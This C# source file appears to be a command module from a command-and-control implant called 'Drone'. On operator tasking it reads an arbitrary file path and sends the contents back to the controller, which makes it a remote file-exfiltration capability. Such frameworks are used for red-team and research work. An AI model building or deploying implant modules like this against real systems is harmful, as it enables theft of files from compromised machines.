using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class ReadFile : DroneCommand
{
    public override byte Command => 0x16;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var text = File.ReadAllText(task.Arguments[0]);
        await Drone.SendTaskOutput(task.Id, text);
    }
}